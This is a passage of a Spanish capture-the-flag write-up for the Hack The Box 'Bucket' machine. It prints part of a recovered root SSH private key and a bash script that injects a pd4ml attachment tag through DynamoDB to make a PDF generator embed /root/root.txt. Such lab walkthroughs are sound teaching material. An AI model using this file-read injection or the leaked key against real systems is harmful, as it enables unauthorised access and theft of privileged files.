+1VtctpCOi6+CMcv1IMvdFtBLbieffTAOF1rSJds4m00MpqqwDiQdgN5ghcOubTXi3cbjz9
+uCTBtXO2dcLfHAqhqYSa7eM0x5pwX54Hr9SP0qJp5y0ueraiOdoSJD5SmgBfIfCzUDZAMn
+de3YGZ0Q4a86BVgsD2Vl54+9hoLOYMsiV9g4S76+PmBiuwi/Wrxtoyzr3/htJVmCpm+WfO
+r4QQZyCFAVo21sLfIqMcPBqlur5FvrWtUUCA0usfx/j40V/l5WAIioIOX0XmX0kll1f6P7
+1+d/BXAQNvyt/aOennafgvzsj23w5m4sOTBNOgBlAAAFiC6rIUsuqyFLAAAAB3NzaC1yc2
+EAAAGBAMelaYSjMsbq45XZm+nctTkp9A/XbphQFAnkqCAsIYbKvn2ncdtUlG0K/7p6Hyq5
+oDTAIY5qxwojGqZg8NXXMo+D0j7cKOiL61dBrsrt+C2sNRGr/bFdYYMwy5vPbQAe34diTf
+Dgf+HbdLFsR8c1nwphxeQwVkpcXZPiuB9ryfnkwNhcU9rXiz5iXexvZr2p4dVbXLaQjouv
+gjHL9SDL3RbQS24nn30wDhda0iXbOJtNDKaqsA4kHYDeYIXDrm014t3G48/bgkwbVztnXC
+...
+```
+
+La copiamos, guardamos en un archivo, le damos los permisos necesarios: `chmod 700 keyroot` e intentamos ingresar mediante `SSH`:
+
+![283bash_log_with_idRsa_root](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283bash_log_with_idRsa_root.png)
+
+OPAAAAAAAAAAAAAAa tamos dentro compita (: Solo nos quedarían por ver las flags:
+
+![283flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283flags.png)
+
+...
+
+**Nota:**
+
+> Como vimos lo que explotamos no fue la ruta absoluta que había comentado que probablemente podríamos cambiar, sino que nos aprovechamos de un feature de la herramienta y de un proceso que llama la herramienta. Ya que el archivo `index.php` lee el contenido de la tabla y extrae la fila `data` para guardarla en un archivo, de ese archivo es que se genera el PDF (: Muy lindo la verdad.
+
+...
+
+En resumen, el proceso para ver el contenido de la bandera del usuario `root` sería algo así plasmado en un script (ya que la tabla es borrada en pocos segundos):
+
+```bash
+#!/bin/bash
+
+#Create table `alerts`
+aws --endpoint-url=http://localhost:4566 dynamodb --region us-east-1 create-table --table-name alerts \
+        --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
+        --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
+        --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5
+
+#Validate creation
+aws --endpoint-url=http://localhost:4566 dynamodb list-tables
+
+#Add data to the table
+aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
+        --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/root.txt</pd4ml:attachment>"}}'
+
+#Validate data inside table
+aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name alerts
+
+#Generate PDF
+curl -X POST --data "action=get_alerts" http://localhost:8000/index.php
+
+#Read `result.pdf`
+cat /var/www/bucket-app/files/result.pdf
+```
+
+...
+
+Es todo por esta máquina. Muy linda y entretenida, como casi siempre hay momentos en los que me súper pierdo, pero bueno de eso se trata, aprender de todos los tropiezos.
+
+El privesc me pareció muy loco... Pero muy original y a la vez que miedito, todo lo que puede causar un archivo con inputs :P
+
+Por ahora no es más, nos leeremos en otra ocasión, gracias por leer y espero les haya servido. A seguir rompiendo todo 😊
